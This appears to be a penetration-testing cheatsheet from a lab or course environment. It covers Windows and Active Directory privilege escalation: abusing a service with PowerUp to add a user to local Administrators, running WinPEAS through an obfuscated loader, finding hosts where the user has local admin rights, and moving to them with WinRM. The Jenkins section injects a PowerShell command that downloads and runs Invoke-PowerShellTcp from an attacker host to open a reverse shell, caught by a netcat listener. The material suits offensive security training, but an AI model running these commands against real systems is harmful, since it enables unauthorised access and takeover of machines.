# 🏁 Cheatsheet - Fast Commands (PRIVILEGE ESCALATION)

Enumeration - Local Privilege Escalation

### View you current privileges in the domain

```bash
whoami /all
## grupos, privilegios, SID, permisos especiales
net user %username% /domain
## Domain Admin, RDP Users, Backup Operators, etc
net localgroup administrators
## Search about local admin privileges
```

***

> With PowerUP
>
> ```
> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
> . C:\AD\Tools\PowerUp.ps1
> ```

```
Invoke-AllChecks
```

<figure><img src="../../../.gitbook/assets/image (1409).png" alt=""><figcaption></figcaption></figure>

***

### Abuse of Invoke-ServiceAbuse

> Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student113' -Verbose
```

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252F5RCK1D43I1k3yJpw7BTy%252Fimage.png%3Falt%3Dmedia%26token%3Daa8d3d7a-2a47-4e18-83ab-ee3842546fe7&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=437f79f2&#x26;sv=2" alt=""><figcaption></figcaption></figure>

We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!

***

## Local Privilege Escalation - WinPEAS <a href="#local-privilege-escalation-winpeas" id="local-privilege-escalation-winpeas"></a>

You can use WinPEAS using the following command. Note that we use an obfuscated version of WinPEAS:

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```

<figure><img src="../../../.gitbook/assets/image (1410).png" alt=""><figcaption></figcaption></figure>

***

## Local Privilege Escalation - PrivEscCheck <a href="#local-privilege-escalation-privesccheck" id="local-privilege-escalation-privesccheck"></a>

Similarly, we can use PrivEscCheck (https://github.com/itm4n/PrivescCheck) for a nice summary of possible privilege escalation opportunities:

```
. C:\AD\Tools\PrivEscCheck.ps1
```

```
Invoke-PrivescCheck
```

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252F7H7qxV3e94XCoh7Qtq2h%252Fimage.png%3Falt%3Dmedia%26token%3De29efb38-8887-4a82-949d-eb1fa78544d2&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=6b80c056&#x26;sv=2" alt=""><figcaption></figcaption></figure>

***

## User Hunt for Local Admin access

Identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```
Find-PSRemotingLocalAdminAccess
```

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252F1VUMHVTPq3cCaplZOV4d%252Fimage.png%3Falt%3Dmedia%26token%3D87f03bca-e003-4ff8-a060-1c1d99f64d5b&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f7e37514&#x26;sv=2" alt=""><figcaption></figcaption></figure>

> It equal to = in whats domain machines are i admin local?

Studentx has administrative access on the pc: dcorp-adminsrv and on the student machine

### Connect by other Domain Machines how Local Admin

```
winrs -r:dcorp-adminsrv cmd
```

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FcaUMSruTgSJnuYeJHf3O%252Fimage.png%3Falt%3Dmedia%26token%3Dfd045b22-1b80-4344-b811-5fb18da0f31b&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=3fedea11&#x26;sv=2" alt=""><figcaption></figcaption></figure>

```
set username
set computername
```

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252F1TzaBrpMILGcFHnCMHqP%252Fimage.png%3Falt%3Dmedia%26token%3De852af28-2d11-4b71-9ee3-af6972ad3dc7&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c40e4353&#x26;sv=2" alt=""><figcaption></figcaption></figure>

***

### PowerShell Remoting

> Note: Remember use a new invishell
>
> ```
> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
> ```

```
## Search
Find-PSRemotingLocalAdminAccess
## Conect
winrs -r:dcorp-adminsrv cmd
### or
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
## After
$env:username
```

<figure><img src="../../../.gitbook/assets/image (1411).png" alt=""><figcaption></figcaption></figure>

***

## Abuse Jenkins Instance

If we get a jenkins intance/login, try to login with username:usernarme pass

Once you are in it, modificate/create a new proyect and insert the revershell command -->

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FUZNDtG42gIh0ogOVCDet%252Fimage.png%3Falt%3Dmedia%26token%3Db795b940-7d26-47d8-b848-1428b2f36e1f&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=ad1d865&#x26;sv=2" alt=""><figcaption></figcaption></figure>

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252F95UhRBgqZC3UVy064Ic6%252Fimage.png%3Falt%3Dmedia%26token%3Ddaa3db46-b170-4a8d-b265-9d3ff223a0ea&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=befb7ce8&#x26;sv=2" alt=""><figcaption></figcaption></figure>

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FzzlsF3krpjrjyY7cKMvq%252Fimage.png%3Falt%3Dmedia%26token%3Da23ad261-4cc3-4b35-91c4-cd6a3a139c88&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f35dcf18&#x26;sv=2" alt=""><figcaption></figcaption></figure>

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252Fds5mjbpQDDnjnBKlk0nw%252Fimage.png%3Falt%3Dmedia%26token%3Dca12c1b1-af92-4f85-801a-aca731cc5203&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=182b9d72&#x26;sv=2" alt=""><figcaption></figcaption></figure>

```
powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.113 -Port 443
```

> Double check the following:
>
> 1. Remember to host the reverse shell on a local web server on your student VM. You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized. You may like to click the up arrow on the right side of the taskbar to open the system tray and double-click on the HFS icon to open it again.
> 2. Also, make sure to add an exception or turn off the firewall on the student VM.
> 3. Check if there is any typo or extra space in the Windows Batch command that you used above in the Jenkins project.
> 4. After you build the project below, check the 'Console Output' of the Jenkins Project to know more about the error.

### Share a folder with Invoke-PowerShellTcp

Fristly, execute HFS to enable the share -->

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FLFOapd2O1bOj1eLq3rZ1%252Fimage.png%3Falt%3Dmedia%26token%3D4b0da185-491e-4e1a-a672-d5934cff8bbd&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=53a2065f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

After, upload the Invoke-PowerShellTcp.ps1 -->

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FqsCZmVbHTRxjAzn4qTCx%252Fimage.png%3Falt%3Dmedia%26token%3D341189ae-c60d-48d8-8cde-14f22a330aa4&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=37b11992&#x26;sv=2" alt=""><figcaption></figcaption></figure>

> Note: There is the route to copy and paste in the command:
>
> powershell.exe iex (iwr _**http://172.16.100.113/Invoke-PowerShellTcp.ps1**_ -UseBasicParsing); ...

Once we have the payload and share run, remember to host turn off the Windows Firewall

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FINeQ2jeekiCRyAutrjhW%252Fimage.png%3Falt%3Dmedia%26token%3Db08bd60b-fac7-4e0b-998f-b918884df21f&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=a51a192b&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Once all it's done, weak up the NetCat and run the build -->

```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FW26tXMj3an8sUO9rFGEE%252Fimage.png%3Falt%3Dmedia%26token%3D8a0787ca-b117-490a-ad23-afe83e4f5d3c&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f9eca2a6&#x26;sv=2" alt=""><figcaption></figcaption></figure>

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252FKYHuSFKy78bJGniLLKLu%252Fimage.png%3Falt%3Dmedia%26token%3D090f0fa3-210f-4954-9418-d3fb74f7bfed&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9e4a12f9&#x26;sv=2" alt=""><figcaption></figcaption></figure>

> Note: I dont need disable anything. If you have issues, reboot the machine

<figure><img src="../../../.gitbook/assets/image (1412).png" alt=""><figcaption></figcaption></figure>

We can now run commands on the reverse shell:

```
$env:username
```

```
ipconfig
```

```
$env:computername
```

<figure><img src="https://eldeim.gitbook.io/brain_fuck/~gitbook/image?url=https%3A%2F%2F3697469405-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FSrcwXlKGkwhzbrKa8vLU%252Fuploads%252F1QYlnzPPhF3EbJLzeAqA%252Fimage.png%3Falt%3Dmedia%26token%3Dc3b4fe31-48e0-460e-9cf4-d2c2e0a7a0e9&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=29dad36d&#x26;sv=2" alt=""><figcaption></figcaption></figure>
